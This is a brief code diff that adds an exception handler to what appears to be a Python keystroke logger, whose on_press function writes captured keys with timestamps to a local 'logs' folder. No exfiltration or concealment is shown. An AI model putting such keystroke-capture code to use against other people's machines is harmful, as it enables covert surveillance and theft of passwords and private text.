@@ -27,6 +27,8 @@ def on_press(key):
         data = data + f'[{key}]'
         write_text_with_datetime(data, directory='logs')
         data = ''
+    except Exception as e:
+        print(f"Error: {e}")
 
 def on_release(key):
     print(f'{key} released')
